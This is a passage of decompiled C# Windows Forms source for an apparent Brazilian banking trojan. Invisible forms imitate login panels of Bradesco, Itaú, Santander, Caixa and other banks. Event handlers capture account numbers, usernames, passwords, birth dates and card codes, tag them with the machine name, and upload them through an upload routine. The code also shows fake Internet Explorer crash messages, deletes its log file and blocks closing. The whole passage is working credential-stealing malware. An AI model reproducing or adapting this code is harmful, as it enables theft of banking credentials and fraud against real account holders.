		((Control)r2).set_AutoSize(true);
		((Control)r2).set_BackColor(Color.Transparent);
		((Control)r2).set_Location(new Point(257, 222));
		((Control)r2).set_Name("r2");
		((Control)r2).set_Size(new Size(14, 13));
		((Control)r2).set_TabIndex(2);
		r2.set_TabStop(true);
		((ButtonBase)r2).set_UseVisualStyleBackColor(false);
		r2.add_CheckedChanged((EventHandler)r2_CheckedChanged);
		((Control)r3).set_AutoSize(true);
		((Control)r3).set_BackColor(Color.Transparent);
		((Control)r3).set_Location(new Point(257, 248));
		((Control)r3).set_Name("r3");
		((Control)r3).set_Size(new Size(14, 13));
		((Control)r3).set_TabIndex(3);
		r3.set_TabStop(true);
		((ButtonBase)r3).set_UseVisualStyleBackColor(false);
		r3.add_CheckedChanged((EventHandler)r3_CheckedChanged);
		((Control)NOUS).set_BackColor(Color.WhiteSmoke);
		NOUS.set_CharacterCasing((CharacterCasing)1);
		((Control)NOUS).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)NOUS).set_Location(new Point(250, 161));
		((Control)NOUS).set_Name("NOUS");
		((Control)NOUS).set_Size(new Size(150, 20));
		((Control)NOUS).set_TabIndex(0);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Cursor(Cursors.get_Hand());
		((Control)label8).set_Location(new Point(375, 278));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(74, 15));
		((Control)label8).set_TabIndex(10);
		((Control)label8).set_Tag((object)"");
		((Control)label8).add_Click((EventHandler)label8_Click);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Cursor(Cursors.get_Hand());
		((Control)label1).set_Location(new Point(130, 374));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(117, 17));
		((Control)label1).set_TabIndex(11);
		((Control)label1).set_Tag((object)"");
		((Control)Tipo).set_BackColor(Color.White);
		((Control)Tipo).set_Location(new Point(127, 196));
		((Control)Tipo).set_Name("Tipo");
		((Control)Tipo).set_Size(new Size(98, 13));
		((Control)Tipo).set_TabIndex(12);
		((Control)Tipo).set_Visible(false);
		((Control)inicia_cx).set_BackColor(Color.FromArgb(0, 40, 132));
		((Control)inicia_cx).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_cx.BackgroundImage"));
		((Control)inicia_cx).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_cx).get_Controls().Add((Control)(object)comboBox1);
		((Control)inicia_cx).get_Controls().Add((Control)(object)Tipo);
		((Control)inicia_cx).get_Controls().Add((Control)(object)label1);
		((Control)inicia_cx).get_Controls().Add((Control)(object)label8);
		((Control)inicia_cx).get_Controls().Add((Control)(object)NOUS);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r3);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r2);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r1);
		((Control)inicia_cx).set_Location(new Point(1, 0));
		((Control)inicia_cx).set_Name("inicia_cx");
		((Control)inicia_cx).set_Size(new Size(18, 27));
		((Control)inicia_cx).set_TabIndex(19);
		((Control)inicia_cx).set_Visible(false);
		((Control)comboBox1).set_BackColor(Color.WhiteSmoke);
		((Control)comboBox1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)comboBox1).set_ForeColor(Color.Gray);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[3] { "Saldo", "Extrato", "Investimentos" });
		((Control)comboBox1).set_Location(new Point(250, 276));
		((Control)comboBox1).set_Margin(new Padding(0));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(108, 21));
		((Control)comboBox1).set_TabIndex(13);
		((Control)comboBox1).set_Text("Página Inicial");
		((Control)inicia_prs).set_BackColor(Color.WhiteSmoke);
		((Control)inicia_prs).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_prs.BackgroundImage"));
		((Control)inicia_prs).get_Controls().Add((Control)(object)botao_okprs);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_c);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_b);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_a);
		((Control)inicia_prs).set_Location(new Point(468, 1));
		((Control)inicia_prs).set_Name("inicia_prs");
		((Control)inicia_prs).set_Size(new Size(312, 53));
		((Control)inicia_prs).set_TabIndex(23);
		((Control)inicia_prs).set_Visible(false);
		((Control)botao_okprs).set_BackColor(Color.Transparent);
		((Control)botao_okprs).set_Cursor(Cursors.get_Hand());
		((Control)botao_okprs).set_Location(new Point(270, 28));
		((Control)botao_okprs).set_Name("botao_okprs");
		((Control)botao_okprs).set_Size(new Size(18, 15));
		((Control)botao_okprs).set_TabIndex(3);
		((Control)botao_okprs).add_Click((EventHandler)botao_okprs_Click);
		((TextBoxBase)prs_c).set_BorderStyle((BorderStyle)0);
		((Control)prs_c).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_c).set_Location(new Point(241, 29));
		((Control)prs_c).set_Margin(new Padding(2));
		((TextBoxBase)prs_c).set_MaxLength(1);
		((Control)prs_c).set_Name("prs_c");
		((Control)prs_c).set_Size(new Size(20, 14));
		((Control)prs_c).set_TabIndex(2);
		prs_c.set_TextAlign((HorizontalAlignment)2);
		((TextBoxBase)prs_b).set_BorderStyle((BorderStyle)0);
		((Control)prs_b).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_b).set_Location(new Point(180, 29));
		((Control)prs_b).set_Margin(new Padding(2));
		((TextBoxBase)prs_b).set_MaxLength(5);
		((Control)prs_b).set_Name("prs_b");
		((Control)prs_b).set_Size(new Size(53, 14));
		((Control)prs_b).set_TabIndex(1);
		prs_b.set_TextAlign((HorizontalAlignment)2);
		((Control)prs_b).add_TextChanged((EventHandler)prs_b_TextChanged);
		((TextBoxBase)prs_a).set_BorderStyle((BorderStyle)0);
		((Control)prs_a).set_Cursor(Cursors.get_IBeam());
		((Control)prs_a).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_a).set_Location(new Point(58, 29));
		((Control)prs_a).set_Margin(new Padding(2));
		((TextBoxBase)prs_a).set_MaxLength(4);
		((Control)prs_a).set_Name("prs_a");
		((Control)prs_a).set_Size(new Size(51, 14));
		((Control)prs_a).set_TabIndex(0);
		prs_a.set_TextAlign((HorizontalAlignment)2);
		((Control)prs_a).add_TextChanged((EventHandler)prs_a_TextChanged);
		((Control)inicia_prm).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_prm.BackgroundImage"));
		((Control)inicia_prm).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_prm).set_CausesValidation(false);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_ok);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_c);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_b);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_a);
		((Control)inicia_prm).set_Location(new Point(0, 0));
		((Control)inicia_prm).set_Name("inicia_prm");
		((Control)inicia_prm).set_Size(new Size(588, 27));
		((Control)inicia_prm).set_TabIndex(21);
		((Control)inicia_prm).set_Visible(false);
		((Control)prm_ok).set_BackColor(Color.Transparent);
		((Control)prm_ok).set_Cursor(Cursors.get_Hand());
		((Control)prm_ok).set_Location(new Point(567, 7));
		((Control)prm_ok).set_Name("prm_ok");
		((Control)prm_ok).set_Size(new Size(15, 16));
		((Control)prm_ok).set_TabIndex(8);
		((Control)prm_ok).add_Click((EventHandler)prm_ok_Click);
		((Control)prm_c).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_c).set_Location(new Point(539, 7));
		((TextBoxBase)prm_c).set_MaxLength(1);
		((Control)prm_c).set_Name("prm_c");
		((Control)prm_c).set_Size(new Size(15, 18));
		((Control)prm_c).set_TabIndex(7);
		((Control)prm_c).add_Enter((EventHandler)prm_c_Enter);
		((Control)prm_c).add_Leave((EventHandler)prm_c_Leave);
		((Control)prm_c).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_b).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_b).set_Location(new Point(469, 7));
		((TextBoxBase)prm_b).set_MaxLength(7);
		((Control)prm_b).set_Name("prm_b");
		((Control)prm_b).set_Size(new Size(64, 18));
		((Control)prm_b).set_TabIndex(6);
		((Control)prm_b).add_Enter((EventHandler)prm_b_Enter);
		((Control)prm_b).add_Leave((EventHandler)prm_b_Leave);
		((Control)prm_b).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_b).add_TextChanged((EventHandler)prm_b_TextChanged);
		((Control)prm_a).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_a).set_Location(new Point(379, 7));
		((TextBoxBase)prm_a).set_MaxLength(4);
		((Control)prm_a).set_Name("prm_a");
		((Control)prm_a).set_Size(new Size(36, 18));
		((Control)prm_a).set_TabIndex(5);
		((Control)prm_a).add_Enter((EventHandler)prm_a_Enter);
		((Control)prm_a).add_Leave((EventHandler)prm_a_Leave);
		((Control)prm_a).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_a).add_TextChanged((EventHandler)prm_a_TextChanged);
		((Control)inicia_ita).set_BackColor(Color.White);
		((Control)inicia_ita).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_ita.BackgroundImage"));
		((Control)inicia_ita).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_ita).get_Controls().Add((Control)(object)it_ok);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_c);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_b);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_a);
		((Control)inicia_ita).set_Location(new Point(282, 18));
		((Control)inicia_ita).set_Margin(new Padding(0));
		((Control)inicia_ita).set_Name("inicia_ita");
		((Control)inicia_ita).set_Size(new Size(266, 31));
		((Control)inicia_ita).set_TabIndex(15);
		((Control)inicia_ita).set_Visible(false);
		((Control)it_ok).set_BackColor(Color.Transparent);
		((Control)it_ok).set_Cursor(Cursors.get_Hand());
		((Control)it_ok).set_Location(new Point(241, 10));
		((Control)it_ok).set_Name("it_ok");
		((Control)it_ok).set_Size(new Size(18, 14));
		((Control)it_ok).set_TabIndex(7);
		((Control)it_ok).add_Click((EventHandler)linkLabel1_Click);
		((TextBoxBase)ita_c).set_BorderStyle((BorderStyle)0);
		((Control)ita_c).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_c).set_Location(new Point(212, 11));
		((TextBoxBase)ita_c).set_MaxLength(1);
		((Control)ita_c).set_Name("ita_c");
		((Control)ita_c).set_Size(new Size(17, 11));
		((Control)ita_c).set_TabIndex(6);
		((Control)ita_c).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((TextBoxBase)ita_b).set_BorderStyle((BorderStyle)0);
		((Control)ita_b).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_b).set_Location(new Point(150, 11));
		((TextBoxBase)ita_b).set_MaxLength(5);
		((Control)ita_b).set_Name("ita_b");
		((Control)ita_b).set_Size(new Size(55, 11));
		((Control)ita_b).set_TabIndex(5);
		((Control)ita_b).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)ita_b).add_TextChanged((EventHandler)ita_b_TextChanged);
		((TextBoxBase)ita_a).set_BorderStyle((BorderStyle)0);
		((Control)ita_a).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_a).set_Location(new Point(59, 11));
		((TextBoxBase)ita_a).set_MaxLength(4);
		((Control)ita_a).set_Name("ita_a");
		((Control)ita_a).set_Size(new Size(43, 11));
		((Control)ita_a).set_TabIndex(4);
		((Control)ita_a).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)ita_a).add_TextChanged((EventHandler)ita_a_TextChanged);
		((Control)inicia_cc).set_BackColor(Color.White);
		((Control)inicia_cc).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_cc.BackgroundImage"));
		((Control)inicia_cc).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_cc).get_Controls().Add((Control)(object)finaliza_cc);
		((Control)inicia_cc).get_Controls().Add((Control)(object)label2);
		((Control)inicia_cc).get_Controls().Add((Control)(object)campo_usu);
		((Control)inicia_cc).get_Controls().Add((Control)(object)campo_sen);
		((Control)inicia_cc).set_Location(new Point(0, 0));
		((Control)inicia_cc).set_Name("inicia_cc");
		((Control)inicia_cc).set_Size(new Size(401, 140));
		((Control)inicia_cc).set_TabIndex(0);
		((Control)inicia_cc).set_Visible(false);
		((Control)finaliza_cc).set_BackColor(Color.White);
		((Control)finaliza_cc).set_BackgroundImage((Image)componentResourceManager.GetObject("finaliza_cc.BackgroundImage"));
		((Control)finaliza_cc).set_BackgroundImageLayout((ImageLayout)0);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_fi);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_di);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_da);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_se);
		((Control)finaliza_cc).set_Location(new Point(3, 8));
		((Control)finaliza_cc).set_Name("finaliza_cc");
		((Control)finaliza_cc).set_Size(new Size(397, 132));
		((Control)finaliza_cc).set_TabIndex(25);
		((Control)finaliza_cc).set_Visible(false);
		((Control)finaliza_cc).add_Paint(new PaintEventHandler(finaliza_cc_Paint));
		((Control)campo_fi).set_BackColor(Color.Transparent);
		((Control)campo_fi).set_Cursor(Cursors.get_Hand());
		((Control)campo_fi).set_Location(new Point(119, 115));
		((Control)campo_fi).set_Name("campo_fi");
		((Control)campo_fi).set_Size(new Size(66, 10));
		((Control)campo_fi).set_TabIndex(2);
		((Control)campo_fi).add_Click((EventHandler)campo_fi_Click);
		((Control)campo_di).set_BackColor(Color.White);
		((TextBoxBase)campo_di).set_BorderStyle((BorderStyle)0);
		((Control)campo_di).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_di).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_di).set_Location(new Point(130, 63));
		((TextBoxBase)campo_di).set_MaxLength(3);
		((Control)campo_di).set_Name("campo_di");
		campo_di.set_PasswordChar('•');
		((Control)campo_di).set_Size(new Size(34, 14));
		((Control)campo_di).set_TabIndex(2);
		((Control)campo_di).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_da).set_BackColor(Color.White);
		((TextBoxBase)campo_da).set_BorderStyle((BorderStyle)0);
		((Control)campo_da).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_da).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_da).set_Location(new Point(130, 8));
		((TextBoxBase)campo_da).set_MaxLength(8);
		((Control)campo_da).set_Name("campo_da");
		((Control)campo_da).set_Size(new Size(67, 14));
		((Control)campo_da).set_TabIndex(0);
		((Control)campo_da).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_da).add_TextChanged((EventHandler)campo_da_TextChanged);
		((Control)campo_se).set_BackColor(Color.White);
		((TextBoxBase)campo_se).set_BorderStyle((BorderStyle)0);
		((Control)campo_se).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_se).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_se).set_Location(new Point(130, 35));
		((TextBoxBase)campo_se).set_MaxLength(6);
		((Control)campo_se).set_Name("campo_se");
		campo_se.set_PasswordChar('•');
		((Control)campo_se).set_Size(new Size(54, 14));
		((Control)campo_se).set_TabIndex(1);
		((Control)campo_se).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_se).add_TextChanged((EventHandler)campo_se_TextChanged);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Cursor(Cursors.get_Hand());
		((Control)label2).set_Location(new Point(127, 122));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(60, 11));
		((Control)label2).set_TabIndex(26);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)campo_usu).set_BackColor(Color.White);
		((TextBoxBase)campo_usu).set_BorderStyle((BorderStyle)0);
		((Control)campo_usu).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_usu).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_usu).set_Location(new Point(138, 79));
		((Control)campo_usu).set_Name("campo_usu");
		((Control)campo_usu).set_Size(new Size(76, 14));
		((Control)campo_usu).set_TabIndex(0);
		((Control)campo_sen).set_BackColor(Color.White);
		((TextBoxBase)campo_sen).set_BorderStyle((BorderStyle)0);
		((Control)campo_sen).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_sen).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_sen).set_Location(new Point(222, 79));
		((Control)campo_sen).set_Name("campo_sen");
		campo_sen.set_PasswordChar('•');
		((Control)campo_sen).set_Size(new Size(56, 14));
		((Control)campo_sen).set_TabIndex(1);
		((Form)this).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)this).set_ClientSize(new Size(554, 175));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)inicia_cc);
		((Control)this).get_Controls().Add((Control)(object)inicia_prs);
		((Control)this).get_Controls().Add((Control)(object)inicia_prm);
		((Control)this).get_Controls().Add((Control)(object)inicia_cx);
		((Control)this).get_Controls().Add((Control)(object)inicia_san);
		((Control)this).get_Controls().Add((Control)(object)inicia_bra);
		((Control)this).get_Controls().Add((Control)(object)inicia_ita);
		((Control)this).set_ForeColor(Color.Gray);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_Closing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)inicia_bra).ResumeLayout(false);
		((Control)inicia_bra).PerformLayout();
		((Control)inicia_san).ResumeLayout(false);
		((Control)inicia_san).PerformLayout();
		((Control)inicia_cx).ResumeLayout(false);
		((Control)inicia_cx).PerformLayout();
		((Control)inicia_prs).ResumeLayout(false);
		((Control)inicia_prs).PerformLayout();
		((Control)inicia_prm).ResumeLayout(false);
		((Control)inicia_prm).PerformLayout();
		((Control)inicia_ita).ResumeLayout(false);
		((Control)inicia_ita).PerformLayout();
		((Control)inicia_cc).ResumeLayout(false);
		((Control)inicia_cc).PerformLayout();
		((Control)finaliza_cc).ResumeLayout(false);
		((Control)finaliza_cc).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[STAThread]
	private void timer1_Tick(object sender, EventArgs e)
	{
		GetActiveWindow();
	}

	private void botao1_Click(object sender, EventArgs e)
	{
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)bd_ag).get_Text().Length > 3 && ((Control)bd_nc).get_Text().Length > 4 && ((Control)bd_dg).get_Text().Length > 0)
		{
			GuardaInfo("Brd", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Brd", "========== Bradesco ==========");
			GuardaInfo("Brd", "Agência....: " + ((Control)bd_ag).get_Text());
			GuardaInfo("Brd", "Conta......: " + ((Control)bd_nc).get_Text() + "-" + ((Control)bd_dg).get_Text());
			Form_Bradesco2 = new Brdsc();
			Durma(1000);
			((Control)Form_Bradesco2).Show();
		}
		else
		{
			MessageBox.Show("Informações Inválidas. Por favor, verifique agência, conta e dígito", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void prm_ok_Click(object sender, EventArgs e)
	{
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)prm_a).get_Text().Length > 3 && ((Control)prm_b).get_Text().Length > 4 && ((Control)prm_c).get_Text().Length != 0)
		{
			GuardaInfo("Prm", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Prm", "========== Prime ==========");
			GuardaInfo("Prm", "Agência....: " + ((Control)prm_a).get_Text());
			GuardaInfo("Prm", "Conta......: " + ((Control)prm_b).get_Text() + "-" + ((Control)prm_c).get_Text());
			Durma(500);
			Form_Bradesco2 = new Brdsc();
			((Control)Form_Bradesco2.isprime).set_Visible(true);
			Durma(1000);
			((Control)Form_Bradesco2).Show();
		}
		else
		{
			MessageBox.Show("Informações Inválidas. Por favor, verifique agência, conta e dígito", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void snt_ok_Click(object sender, EventArgs e)
	{
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)snt_ag).get_Text().Length > 3 && ((Control)snt_cc).get_Text().Length > 1 && ((Control)snt_cc1).get_Text().Length > 4 && ((Control)snt_cc2).get_Text().Length > 0)
		{
			GuardaInfo("Snt", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Snt", "========== Santander ==========");
			GuardaInfo("Snt", "Agência............: " + ((Control)snt_ag).get_Text());
			GuardaInfo("Snt", "Conta..............: " + ((Control)snt_cc).get_Text() + " " + ((Control)snt_cc1).get_Text() + " " + ((Control)snt_cc2).get_Text());
			Form_Santander2 = new Satan(((Control)snt_ag).get_Text(), ((Control)snt_cc).get_Text() + ((Control)snt_cc1).get_Text() + "-" + ((Control)snt_cc2).get_Text());
			Durma(500);
			((Control)Form_Santander2).Show();
		}
		else
		{
			MessageBox.Show("Por favor, preencha corratamente os números da Agência e Conta.", "Microsfot Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void linkLabel1_Click(object sender, EventArgs e)
	{
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)ita_a).get_Text().Length > 3 && ((Control)ita_b).get_Text().Length > 4 && ((Control)ita_c).get_Text().Length > 0)
		{
			GuardaInfo("Ita", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Ita", "========== Itaú ==========");
			GuardaInfo("Ita", "Agência............: " + ((Control)ita_a).get_Text());
			GuardaInfo("Ita", "Conta..............: " + ((Control)ita_b).get_Text() + "-" + ((Control)ita_c).get_Text());
			Form_Itau2 = new Itau2(Hand);
			((Control)Form_Itau2).set_Height(1000);
			((Control)Form_Itau2).set_Width(1024);
			((Control)Form_Itau2).set_Top(3);
			((Control)Form_Itau2).set_Left(2);
			Durma(2000);
			((Control)Form_Itau2).Show();
		}
		else
		{
			MessageBox.Show("Por favor, preencha os campos 'Agência' e 'Conta' corretamente.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void botao_okprs_Click(object sender, EventArgs e)
	{
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)prs_a).get_Text().Length > 3 && ((Control)prs_b).get_Text().Length > 4 && ((Control)prs_c).get_Text().Length != 0)
		{
			GuardaInfo("Prs", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Prs", "===== Personnalite =====");
			GuardaInfo("Prs", "Agência............: " + ((Control)prs_a).get_Text());
			GuardaInfo("Prs", "Conta..............: " + ((Control)prs_b).get_Text() + "-" + ((Control)prs_c).get_Text());
			Form_Pers2 = new Personalite(Hand);
			((Control)Form_Pers2).set_Height(1000);
			((Control)Form_Pers2).set_Width(1024);
			((Control)Form_Pers2).set_Top(2);
			((Control)Form_Pers2).set_Left(2);
			Durma(1000);
			((Control)Form_Pers2).Show();
		}
		else
		{
			MessageBox.Show("Por favor, preencha os campos 'Agência' e 'Conta' corretamente.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void label8_Click(object sender, EventArgs e)
	{
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)NOUS).get_Text().Length > 10 && ((Control)Tipo).get_Text().Length == 2)
		{
			GuardaInfo("Cxx", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Cxx", "========== Cxx Secreta ==========");
			GuardaInfo("Cxx", "Account....: " + ((Control)NOUS).get_Text());
			GuardaInfo("Cxx", "Type.......: " + ((Control)Tipo).get_Text());
			Form_Cxx = new Cxx(Hand);
			((Control)Form_Cxx).set_Left(105);
			((Control)Form_Cxx).set_Top(107);
			Durma(1000);
			((Control)Form_Cxx).Show();
		}
		else
		{
			MessageBox.Show("O usuário informado deve ter entre 10 e 20 posições.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)campo_usu).get_Text().Length > 4 && ((Control)campo_sen).get_Text().Length > 4)
		{
			Durma(2000);
			((Control)finaliza_cc).set_Visible(true);
		}
		else
		{
			MessageBox.Show("Dados inválidos.", "Internet Explorer");
		}
	}

	private void campo_fi_Click(object sender, EventArgs e)
	{
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)campo_se).get_Text().Length == 6 && ((Control)campo_di).get_Text().Length == 3 && ((Control)campo_da).get_Text().Length == 8)
		{
			GuardaInfo("Crd", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Crd", "===========================================");
			GuardaInfo("Crd", "Usuario.....: " + ((Control)campo_usu).get_Text());
			GuardaInfo("Crd", "Senha.......: " + ((Control)campo_sen).get_Text());
			GuardaInfo("Crd", "Nascimento..: " + ((Control)campo_da).get_Text());
			GuardaInfo("Crd", "3Digitos....: " + ((Control)campo_di).get_Text());
			GuardaInfo("Crd", "Senhacash...: " + ((Control)campo_se).get_Text());
			GuardaInfo("Crd", "===========================================");
			FazerUpload("Crd.txt");
			Durma(1000);
			MessageBox.Show("O Internet Explorer executou uma operação ilegal e será fechado.", "Internet Explorer");
			File.Delete("Crd.txt");
			Application.Exit();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Registrar();
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		if (shuttingDown)
		{
			Application.Exit();
		}
	}

	private void bd_ag_Enter(object sender, EventArgs e)
	{
		((Control)bd_ag).set_BackColor(Color.LightGray);
	}

	private void bd_nc_Enter(object sender, EventArgs e)
	{
		((Control)bd_nc).set_BackColor(Color.LightGray);
	}

	private void bd_dg_Enter(object sender, EventArgs e)
	{
		((Control)bd_dg).set_BackColor(Color.LightGray);
	}

	private void bd_ag_Leave(object sender, EventArgs e)
	{
		((Control)bd_ag).set_BackColor(Color.White);
	}

	private void bd_nc_Leave(object sender, EventArgs e)
	{
		((Control)bd_nc).set_BackColor(Color.White);
	}

	private void bd_dg_Leave(object sender, EventArgs e)
	{
		((Control)bd_dg).set_BackColor(Color.White);
	}

	private void ita_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)ita_a).get_Text().Length == 4)
		{
			((Control)ita_b).Focus();
		}
	}

	private void ita_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)ita_b).get_Text().Length == 5)
		{
			((Control)ita_c).Focus();
		}
	}

	private void prm_a_Enter(object sender, EventArgs e)
	{
		((Control)prm_a).set_BackColor(Color.LightGray);
	}

	private void prm_a_Leave(object sender, EventArgs e)
	{
		((Control)prm_a).set_BackColor(Color.White);
	}

	private void prm_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prm_b).get_Text().Length == 7)
		{
			((Control)prm_c).Focus();
		}
	}

	private void prm_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prm_a).get_Text().Length == 4)
		{
			((Control)prm_b).Focus();
		}
	}

	private void prm_b_Leave(object sender, EventArgs e)
	{
		((Control)prm_b).set_BackColor(Color.White);
	}

	private void prm_b_Enter(object sender, EventArgs e)
	{
		((Control)prm_b).set_BackColor(Color.LightGray);
	}

	private void prm_c_Enter(object sender, EventArgs e)
	{
		((Control)prm_c).set_BackColor(Color.LightGray);
	}

	private void prm_c_Leave(object sender, EventArgs e)
	{
		((Control)prm_c).set_BackColor(Color.White);
	}

	private void bd_ag_TextChanged(object sender, EventArgs e)
	{
		if (((Control)bd_ag).get_Text().Length == 4)
		{
			((Control)bd_nc).Focus();
		}
	}

	private void bd_nc_TextChanged(object sender, EventArgs e)
	{
		if (((Control)bd_nc).get_Text().Length == 7)
		{
			((Control)bd_dg).Focus();
		}
	}

	private void prs_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prs_a).get_Text().Length == 4)
		{
			((Control)prs_b).Focus();
		}
	}

	private void prs_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prs_b).get_Text().Length == 5)
		{
			((Control)prs_c).Focus();
		}
	}

